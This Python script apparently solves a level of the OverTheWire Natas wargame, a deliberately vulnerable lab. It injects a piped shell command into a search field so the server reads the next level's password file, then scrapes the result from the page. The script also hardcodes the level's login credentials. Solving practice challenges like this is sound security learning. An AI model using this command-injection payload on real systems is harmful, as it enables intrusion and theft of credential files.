import requests
import re

def flag(url,username,password):
    post_data = {
            "needle":"|cat /etc/natas_webpass/natas10",
            "submit":"Search"
            }
    site = requests.post(url,auth=(username,password),data=post_data)
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    search = re.compile(r"<pre>(.*?)African", re.DOTALL)
    output_text = search.search(site.text).group(1)
    print("The flag for natas9 is: " + output_text.strip())

if __name__=="__main__":
    url = "http://natas9.natas.labs.overthewire.org/"
    username = "natas9"
    password = "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"
    flag(url,username,password)